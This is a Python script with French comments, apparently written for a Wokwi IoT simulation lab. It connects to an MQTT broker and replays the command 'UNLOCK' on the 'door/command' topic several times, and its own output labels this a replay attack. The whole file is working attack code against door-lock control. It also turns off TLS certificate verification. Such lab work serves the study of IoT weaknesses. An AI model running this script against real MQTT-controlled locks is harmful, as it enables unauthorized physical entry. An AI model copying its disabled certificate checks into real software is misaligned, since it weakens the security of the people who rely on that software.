import paho.mqtt.client as mqtt
import time
import ssl

# Configuration MQTT (à adapter avec les informations de votre projet Wokwi)
MQTT_BROKER = ""
MQTT_PORT = 8883
MQTT_USER = ""
MQTT_PASS = "" # Remplacez par le vrai mot de passe de votre projet
TOPIC_COMMAND = "door/command"

# Message à rejouer
REPLAY_MESSAGE = "UNLOCK"

# Nombre de fois que le message sera rejoué
REPLAY_COUNT = 5

# Délai entre chaque rejeu (en secondes)
REPLAY_DELAY = 2

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connecté au broker MQTT avec succès!")
    else:
        print(f"Échec de la connexion, code de retour: {rc}")

def on_publish(client, userdata, mid):
    print(f"Message publié (MID: {mid})")

# Création du client MQTT
client = mqtt.Client()
client.on_connect = on_connect
client.on_publish = on_publish

# Configuration TLS/SSL
# Pour une simulation rapide, vous pouvez utiliser CERT_NONE, mais en production, utilisez CERT_REQUIRED avec un ca_certs
client.tls_set(tls_version=ssl.PROTOCOL_TLSv1_2, cert_reqs=ssl.CERT_NONE)
# Si vous avez le certificat CA d'EMQX, vous pouvez l'utiliser comme ceci:
# client.tls_set(ca_certs="/path/to/emqx-ca.pem", tls_version=ssl.PROTOCOL_TLSv1_2, cert_reqs=ssl.CERT_REQUIRED)

client.username_pw_set(MQTT_USER, MQTT_PASS)

try:
    print(f"Tentative de connexion au broker: {MQTT_BROKER}:{MQTT_PORT}")
    client.connect(MQTT_BROKER, MQTT_PORT, 60)
    client.loop_start() # Démarre une boucle en arrière-plan pour gérer les connexions et les messages

    time.sleep(2) # Attendre que la connexion soit établie

    if client.is_connected():
        print(f"Début de l'attaque par rejeu sur le topic '{TOPIC_COMMAND}' avec le message '{REPLAY_MESSAGE}'")
        for i in range(REPLAY_COUNT):
            print(f"Rejeu {i+1}/{REPLAY_COUNT}...")
            client.publish(TOPIC_COMMAND, REPLAY_MESSAGE, qos=1, retain=False)
            time.sleep(REPLAY_DELAY)
        print("Attaque par rejeu terminée.")
    else:
        print("Le client MQTT n'est pas connecté. Vérifiez les identifiants et la connectivité.")

except Exception as e:
    print(f"Une erreur est survenue: {e}")
finally:
    client.loop_stop()
    client.disconnect()
    print("Client MQTT déconnecté.")
